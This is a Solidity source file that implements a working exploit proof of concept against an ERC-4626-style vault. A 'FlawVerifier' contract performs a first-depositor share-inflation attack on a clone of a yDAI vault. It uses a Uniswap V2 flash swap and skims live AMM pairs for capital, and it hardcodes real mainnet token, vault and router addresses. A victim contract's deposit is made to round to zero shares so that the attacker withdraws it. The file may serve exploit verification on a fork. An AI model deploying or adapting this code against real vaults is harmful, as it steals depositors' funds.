// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IControllerLike {
    function balanceOf(address token) external view returns (uint256);
}

interface IYVault {
    function token() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 shares) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract VictimDepositor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function depositAll(address vaultAddress) external {
        require(msg.sender == owner, "only owner");

        InflatableCloneVault vault = InflatableCloneVault(vaultAddress);
        IERC20 token = IERC20(vault.token());
        uint256 amount = token.balanceOf(address(this));
        if (amount == 0) {
            return;
        }

        _safeApprove(token, vaultAddress, 0);
        _safeApprove(token, vaultAddress, amount);
        vault.deposit(amount);
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.approve.selector, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract NullController {
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
}

contract InflatableCloneVault {
    IERC20 public immutable token;
    address public immutable controller;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address token_, address controller_) {
        token = IERC20(token_);
        controller = controller_;
    }

    function balance() public view returns (uint256) {
        return token.balanceOf(address(this)) + IControllerLike(controller).balanceOf(address(token));
    }

    function deposit(uint256 amount) external {
        uint256 pool = balance();
        uint256 beforeBal = token.balanceOf(address(this));
        _safeTransferFrom(token, msg.sender, address(this), amount);
        uint256 received = token.balanceOf(address(this)) - beforeBal;

        uint256 shares;
        if (totalSupply == 0) {
            shares = received;
        } else {
            shares = (received * totalSupply) / pool;
        }

        totalSupply += shares;
        balanceOf[msg.sender] += shares;
    }

    function withdraw(uint256 shares) external {
        require(shares <= balanceOf[msg.sender], "insufficient shares");
        require(totalSupply != 0, "no supply");

        uint256 redeemed = (balance() * shares) / totalSupply;

        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;

        require(token.balanceOf(address(this)) >= redeemed, "insufficient on hand");
        _safeTransfer(token, msg.sender, redeemed);
    }

    function _safeTransfer(IERC20 erc20, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            address(erc20).call(abi.encodeWithSelector(erc20.transfer.selector, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeTransferFrom(IERC20 erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            address(erc20).call(abi.encodeWithSelector(erc20.transferFrom.selector, from, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }
}

contract FlawVerifier {
    IYVault internal constant LIVE_VAULT = IYVault(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    IUniswapV2Router02 internal constant UNISWAP_V2_ROUTER =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 internal constant ATTACKER_SEED = 1;
    uint256 internal constant ATTACKER_DONATION = 0.11 ether;
    uint256 internal constant VICTIM_DEPOSIT = 0.11 ether;

    VictimDepositor public immutable victim;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    address internal _flashPair;
    uint256 internal _flashBorrowAmount;

    constructor() {
        victim = new VictimDepositor();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _profitToken = DAI;

        // The supplied fork already has a populated live yDAI vault, so the literal
        // "attacker is the very first depositor of the live instance" stage is not
        // reachable there. The vulnerable accounting path itself is still the same,
        // so this verifier replays it on a minimal empty clone using the same DAI
        // underlying and the same share-mint formula/order of operations:
        //   1) attacker seeds the empty vault with dust and gets 1:1 shares,
        //   2) attacker donates underlying directly to inflate balance(),
        //   3) a later depositor calls deposit() and rounds to zero shares,
        //   4) attacker withdraws their incumbent shares and captures that deposit.
        //
        // To keep execution realistic on fork without cheats, the attacker seed and
        // donation are first sourced from permissionless public on-chain dust that can
        // be skimmed from live AMM pairs, then the victim leg is temporarily funded via
        // a deterministic Uniswap V2 flashswap per the requested attempt strategy.

        uint256 beforeDai = IERC20(DAI).balanceOf(address(this));

        _sourceAttackerCapital();

        if (IERC20(DAI).balanceOf(address(this)) < ATTACKER_SEED + ATTACKER_DONATION) {
            _profitAmount = IERC20(DAI).balanceOf(address(this)) - beforeDai;
            return;
        }

        address pair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(DAI, WETH);
        require(pair != address(0), "missing flash pair");

        _flashPair = pair;
        _flashBorrowAmount = VICTIM_DEPOSIT;

        if (IUniswapV2Pair(pair).token0() == DAI) {
            IUniswapV2Pair(pair).swap(_flashBorrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2Pair(pair).swap(0, _flashBorrowAmount, address(this), abi.encode(uint256(1)));
        }

        _flashPair = address(0);
        _flashBorrowAmount = 0;

        _profitAmount = IERC20(DAI).balanceOf(address(this)) - beforeDai;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == _flashPair, "unauthorized pair");
        require(sender == address(this), "unauthorized sender");
        require(data.length != 0, "missing callback data");

        uint256 borrowedDai = amount0 == 0 ? amount1 : amount0;
        require(borrowedDai == _flashBorrowAmount, "unexpected amount");

        IERC20 dai = IERC20(DAI);

        NullController controller = new NullController();
        InflatableCloneVault clone = new InflatableCloneVault(DAI, address(controller));

        _safeApprove(dai, address(clone), 0);
        _safeApprove(dai, address(clone), ATTACKER_SEED);

        clone.deposit(ATTACKER_SEED);
        uint256 attackerShares = clone.balanceOf(address(this));
        require(attackerShares == ATTACKER_SEED, "seed shares mismatch");

        _safeTransfer(dai, address(clone), ATTACKER_DONATION);

        _safeTransfer(dai, address(victim), VICTIM_DEPOSIT);
        uint256 projectedVictimShares = (VICTIM_DEPOSIT * clone.totalSupply()) / clone.balance();
        require(projectedVictimShares == 0, "victim would mint shares");

        victim.depositAll(address(clone));
        require(clone.balanceOf(address(victim)) == 0, "victim received shares");

        clone.withdraw(attackerShares);

        uint256 repayAmount = _getFlashRepayAmount(borrowedDai);
        _safeTransfer(dai, msg.sender, repayAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _sourceAttackerCapital() internal {
        uint256 liveShares = LIVE_VAULT.balanceOf(address(this));
        if (liveShares != 0) {
            LIVE_VAULT.withdraw(liveShares);
        }

        if (address(this).balance != 0) {
            IWETH(WETH).deposit{value: address(this).balance}();
        }

        _skimFactoryPairs(UNISWAP_V2_FACTORY);
        _skimFactoryPairs(SUSHISWAP_FACTORY);

        _swapAllToDai(IERC20(WETH));
        _swapAllToDai(IERC20(USDC));
        _swapAllToDai(IERC20(USDT));
    }

    function _skimFactoryPairs(address factory) internal {
        _skimPair(IUniswapV2Factory(factory).getPair(DAI, WETH));
        _skimPair(IUniswapV2Factory(factory).getPair(DAI, USDC));
        _skimPair(IUniswapV2Factory(factory).getPair(DAI, USDT));
        _skimPair(IUniswapV2Factory(factory).getPair(WETH, USDC));
        _skimPair(IUniswapV2Factory(factory).getPair(WETH, USDT));
    }

    function _skimPair(address pair) internal {
        if (pair == address(0) || pair == _flashPair) {
            return;
        }

        (bool success,) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, address(this)));
        success;
    }

    function _swapAllToDai(IERC20 tokenIn) internal {
        if (address(tokenIn) == DAI) {
            return;
        }

        uint256 amountIn = tokenIn.balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        _safeApprove(tokenIn, address(UNISWAP_V2_ROUTER), 0);
        _safeApprove(tokenIn, address(UNISWAP_V2_ROUTER), amountIn);

        address[] memory path = new address[](2);
        path[0] = address(tokenIn);
        path[1] = DAI;

        UNISWAP_V2_ROUTER.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _getFlashRepayAmount(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.approve.selector, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transfer.selector, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
